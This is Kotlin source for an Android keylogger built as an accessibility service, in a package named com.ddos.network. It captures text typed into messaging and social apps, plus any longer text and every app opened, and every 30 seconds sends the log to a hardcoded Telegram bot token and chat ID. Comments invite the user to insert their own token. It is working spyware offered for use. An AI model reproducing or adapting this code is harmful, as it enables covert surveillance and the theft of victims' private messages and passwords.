package com.ddos.network

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class Keylogger : AccessibilityService() {

    // 🔴 BOT TOKEN YAHAN DAALO
    private val bot by lazy {
        TelegramBot(
            "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
            "8507217564",    // ← YAHAN APNA CHAT ID DAALO
            this
        )
    }

    private val buffer = StringBuilder()
    private val executor = Executors.newSingleThreadScheduledExecutor()

    override fun onServiceConnected() {
        super.onServiceConnected()

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }

        serviceInfo = info

        // Send buffer every 30 seconds
        executor.scheduleWithFixedDelay({
            sendBuffer()
        }, 30, 30, TimeUnit.SECONDS)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                val packageName = event.packageName?.toString() ?: return

                // Only capture from messaging apps or significant text
                val targetApps = listOf(
                    "com.whatsapp", "com.instagram.android", "com.facebook.orca",
                    "com.telegram.messenger", "com.snapchat.android", "com.twitter.android",
                    "com.discord", "com.google.android.apps.messaging"
                )

                if (packageName in targetApps || text.length > 3) {
                    buffer.append("\n[$packageName] $text")
                }
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return
                buffer.append("\n[APP OPENED] $packageName")
            }
        }
    }

    override fun onInterrupt() {
        // Service interrupted
    }

    private fun sendBuffer() {
        if (buffer.isEmpty()) return

        val text = buffer.toString()
        buffer.clear()

        // Split if too long
        val chunks = text.chunked(4000)
        for (chunk in chunks) {
            bot.sendMessage("⌨️ KEYLOGS:\n$chunk")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        sendBuffer()
        executor.shutdown()
    }
}
